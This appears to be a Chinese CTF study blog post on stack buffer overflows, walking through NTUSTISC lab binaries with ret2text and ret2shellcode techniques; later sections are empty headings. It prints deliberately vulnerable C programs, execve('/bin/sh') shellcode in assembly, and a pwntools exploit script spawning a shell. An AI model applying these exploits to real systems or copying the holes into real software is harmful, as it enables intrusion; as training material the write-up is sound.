---
title: Pwn入门(2):Stack Overflow实战小结
date: 2021-12-26 14:09:00 +0800
author: sirius
categories: [CTF]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---

接着上一篇Pwn基础知识，这篇写一下栈溢出的实验小结，分成两个大部分：

- NTUSTISC视频中留的练习题
- CTF WIKI上的stack overflow部分题目



## NTUSTISC Lab

Lab0 的 pwntools上手题

![image-20211227225123600](/assets/img/2022/image-20211227225123600.png)

## Return to Text 

### # Lab1

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
  execve("/bin/sh", (char *[]){0}, (char *[]){0});
}

int main()
{
  char buf[16];
  puts("This is your first bof challenge ;)");
  fflush(stdout);
  read(0, buf, 0x30);
  return 0;
}
```



![image-20211227225905877](/assets/img/2022/image-20211227225905877.png)

> 没有栈保护，代码15行读取0x30字节，buffer overflow，覆盖返回地址为y0u_c4n7_533_m3()函数地址即可。
>
> `objdump -d bof`:
>
> ![image-20211227232815402](/assets/img/2022/image-20211227232815402.png)



![image-20211227230813864](/assets/img/2022/image-20211227230813864.png)



### # Lab2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void y0u_c4n7_533_m3()
{
  int allow = 0;
  if (allow) {
    execve("/bin/sh", 0, 0);
  }
  else {
    puts("Oh no~~~!");
    exit(0);
  }
}

int main()
{
  char buf[16];
  puts("This is your second bof challenge ;)");
  fflush(stdout);
  read(0, buf, 0x30);
  if (strlen(buf) >= 16) {
    puts("Bye bye~~");
    exit(0);
  }
  return 0;
}
```


![image-20211227233212607](/assets/img/2022/image-20211227233212607.png)

> 和第一个基本一样，控制程序执行流return到`execve("/bin/sh", 0, 0);`这一行即可。
>
> 第24行的bypass：strlen判断结束为接收到'\0'位置，所以直接传`\x00`就可以bypass

![image-20211227235502065](/assets/img/2022/image-20211227235502065.png)

![image-20211228000202164](/assets/img/2022/image-20211228000202164.png){: .normal}

strlen 精准bypass，但是没必要。直接全传`\x00`不香🐴  ，都不用算长度


## Return to Shellcode

### # Lab3

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char message[48];

int main()
{
  char name[16];
  printf("Give me your message: ");
  fflush(stdout);
  read(0, message, 0x30);
  printf("Give me your name: ");
  fflush(stdout);
  read(0, name, 0x30);
  return 0;
}
```

![image-20211228211845743](/assets/img/2022/image-20211228211845743.png)

> 知识点导航：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#return-to-shellcode
>
> 没有开NX，所以可以向message中写入shellcode，并且在第15行控制程序执行流跳转到message处，执行shellcode

由于没有开PIE，所以程序运行时message所在的地址是不变的，可以通过如下图方式查看验证一波：

![image-20211228214000710](/assets/img/2022/image-20211228214000710.png)

简单的利用，shellcode就如下图所示，只要把rdi, rsi, rdx设置好，rax设为0x3b，最后调用syscall

https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md ,这个网站可以查syscall table

![image-20211228221733106](/assets/img/2022/image-20211228221733106.png)

![image-20211228221721048](/assets/img/2022/image-20211228221721048.png)

![image-20211228221554081](/assets/img/2022/image-20211228221554081.png)

> ![image-20211228223709889](/assets/img/2022/image-20211228223709889.png){: .normal}
>
> 0x68732f6e69622f这个数字就是"/bin/sh"的小端序表示，放进内存后计算机读取时就是/bin/sh，这个数字可以这么获得：
>
> ![image-20211228223842892](/assets/img/2022/image-20211228223842892.png){: .normal}
>
> 小端序就是 数据的低位存储在内存的低位
>
> ![image-20220101223657197](/assets/img/2022/image-20220101223657197.png){: .normal}
>
> 

![image-20211228221521394](/assets/img/2022/image-20211228221521394.png)

或者直接调用pwntools的shellcraft模块

![image-20211228222835433](/assets/img/2022/image-20211228222835433.png)

exp:

```python
from pwn import *


r = process("./ret2sc")
context(arch='amd64', os='linux')

r.recvuntil("message:")

# sc = """
# mov rbx, 0x68732f6e69622f
# push rbx
# mov rdi, rsp
# xor rsi, rsi
# xor rdx, rdx
# mov rax, 0x3b
# syscall
# """
# sc = asm(sc, arch="amd64")
r.send(asm(shellcraft.sh()))

r.recvuntil("name:")
p = "a"*0x18 + p64(0x601060)
r.send(p)

r.interactive()
```



在做题时想到的一个问题，为什么不能直接用`mov rdi,0x68732f6e69622f ` ，给rdi直接赋值呢，下面这段shellcode实际并不会拿到shell。

![image-20211229203010746](/assets/img/2022/image-20211229203010746.png)

原因其实也很简单，因为原先rdi等于0，给他附上0x68732f6e69622f后，实际这个是地址的值

![image-20220101221503781](/assets/img/2022/image-20220101221503781.png)

再对比下正确的方式，注意看`x/gx $rdi 和 x/s $rdi`, 通过取$rdi地址上存储的数据，得到`/bin/sh`

![image-20220101223133449](/assets/img/2022/image-20220101223133449.png){: .normal}

## GOT Hijacking

### # Lab4



## ROP base

### # Lab5



## Return to PLT

### # Lab6



## Return to libc

### # Lab7







##  CTF wiki

## 基本ROP

### # ret2text



### # ret2shellcode



## 中级ROP



## 高级ROP

